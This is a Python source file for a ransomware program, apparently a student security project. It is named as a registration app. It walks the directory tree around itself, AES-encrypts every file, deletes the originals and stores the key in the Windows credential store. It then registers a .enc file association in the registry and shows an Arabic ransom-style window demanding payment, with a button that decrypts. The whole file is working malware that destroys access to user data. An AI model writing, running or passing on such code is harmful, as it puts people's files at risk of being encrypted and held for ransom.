import os
import sys
import winreg
import keyring
import ttkbootstrap as ttk
from ttkbootstrap.constants import *
from tkinter import messagebox
from Cryptodome.Cipher import AES

# Get all files in the current directory and subdirectories
def get_all_files_in_directory():
    targets = []
    base_dir = os.path.dirname(os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__))

    while True:
        if 'RegisterationApp.exe' in os.listdir(base_dir) or 'RegisterationApp.py' in os.listdir(base_dir):
            break
        parent_dir = os.path.dirname(base_dir) 
        base_dir = parent_dir

    pyinstaller_temp = os.environ.get('TEMP', '')
    if '_MEI' in base_dir:
        print("⚠ Detected PyInstaller temp dir as base — aborting.")
        return []

    for root, dirs, files in os.walk(base_dir):
        # Skip PyInstaller temp folder if it shows up
        if '_MEI' in root or pyinstaller_temp in root:
            continue
        dirs[:] = [d for d in dirs if not d.startswith('.')]
        for file in files:
            # Exclude my script to avoid locking myself out or already encrypted files
            if file.startswith('.') or file in ['RegisterationApp.py', 'RegisterationApp.exe', 'hash.py']:
                continue

            filepath = os.path.join(root, file)
            targets.append(filepath)
    return targets

def generate_key():
    key = os.urandom(16)        # 128 bits = 16 bytes
    key_hex = key.hex()
    keyring.set_password("SecurityProject", "EncryptionKey", key_hex)

    return key

def read_binary(file_path):
    try:
        with open(file_path, 'rb') as f:
            return f.read()
    except Exception as e:
        print(f"Error reading file: {file_path} – {e}")
        return None

def pad(data):
    """Pad data to be multiple of 16 bytes."""
    padding_length = 16 - (len(data) % 16)
    return data + bytes([padding_length]) * padding_length

def encrypt_file(file_path, key):
    data = read_binary(file_path)

    padded_data = pad(data)
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted_data = cipher.encrypt(padded_data)

    # Create encrypted blob file
    encrypted_file_path = file_path + '.enc'
    with open(encrypted_file_path, 'wb') as f:
        f.write(iv + encrypted_data)

    # Remove the original file
    os.remove(file_path)
    return encrypted_file_path

def encrypt_files_in_directory():
    files = get_all_files_in_directory()
    key = generate_key()

    for file_path in files:
        if file_path.endswith('.enc'):
            continue
        encrypt_file(file_path, key)

    print("All files have been encrypted.")

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        iv = f.read(16)
        encrypted_data = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data)

    # Remove padding
    padding_length = decrypted_data[-1]
    decrypted_data = decrypted_data[:-padding_length]

    # Create decrypted file
    decrypted_file_path = file_path[:-4]  # Remove .enc extension
    with open(decrypted_file_path, 'wb') as f:
        f.write(decrypted_data)

    # Remove the encrypted file
    os.remove(file_path)
    return decrypted_file_path

def decrypt_files_in_directory():
    files = get_all_files_in_directory()
    # Retrieve the key securely from the Windows Credentials Store
    key = bytes.fromhex(keyring.get_password("SecurityProject", "EncryptionKey"))

    for file_path in files:
        if not file_path.endswith('.enc'):
            continue
        decrypt_file(file_path, key)

    print("All files have been decrypted.")

def simulate_payment():
    def on_pay():
        # Decrypt files in the current directory
        decrypt_files_in_directory()

        messagebox.showinfo("🙏 تمت المهمة", "حمد لله على السلامة...\nوقدر ولطف 🙏💾")
        root.destroy()

    root = ttk.Window(themename="darkly")
    root.title("💥 فين الناس؟ فين الدنيا؟!")
    root.geometry("600x420")
    root.resizable(False, False)

    # Set a fixed dark background color
    bg_color = "#212529"

    # Outer container
    outer = ttk.Frame(root, padding=30)
    outer.pack(expand=True, fill="both")

    # Emoji label
    emoji_label = ttk.Label(
        outer,
        text="😨",
        font=("Segoe UI Emoji", 60),
        background=bg_color,
        foreground="white"
    )
    emoji_label.pack(pady=(0, 15))

    # Meme text label
    message_label = ttk.Label(
        outer,
        text=(
            "فين الناس؟ فين الدنيا؟؟!\n"
            "كل الملفات راحت...\n\n"
            "ادفع قبل ما نمسح كل حاجة 😱"
        ),
        font=("Cairo", 13, "bold"),
        background=bg_color,
        foreground="white",
        justify="center",
        wraplength=500
    )
    message_label.pack(pady=(0, 25))

    # Button
    pay_button = ttk.Button(
        outer,
        text="🗝️ افتح يا عم، أنا عمدة",
        command=on_pay,
        bootstyle="success-outline",
        width=30
    )
    pay_button.pack(ipady=5)

    # Apply background color manually
    outer.configure(style="Custom.TFrame")
    style = ttk.Style()
    style.configure("Custom.TFrame", background=bg_color)

    root.mainloop()

def enc_file_association():
    try:
        script_path = os.path.abspath(__file__)
        python_path = sys.executable
        command = f'"{python_path}" "{script_path}" "%1"'

        # Base path for current user's registry settings
        base_key = r"Software\Classes"

        # 1. Associate .enc extension with custom file type
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, base_key + r"\.enc") as ext_key:
            winreg.SetValueEx(ext_key, "", 0, winreg.REG_SZ, "EncryptedFileHandler")

        # 2. Define how EncryptedFileHandler opens files
        command_key_path = base_key + r"\EncryptedFileHandler\shell\open\command"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, command_key_path) as cmd_key:
            winreg.SetValueEx(cmd_key, "", 0, winreg.REG_SZ, command)

        print(".enc file association registered for the current user.")

    except Exception as e:
        print(f"Failed to register .enc file association: {e}")

def main():
    if len(sys.argv) > 1:
        simulate_payment()
    else:
        # Encrypt files in the current directory
        encrypt_files_in_directory()

        # Register file association for .enc files
        enc_file_association()

        # Simulate the ransom note and payment process
        simulate_payment()

main()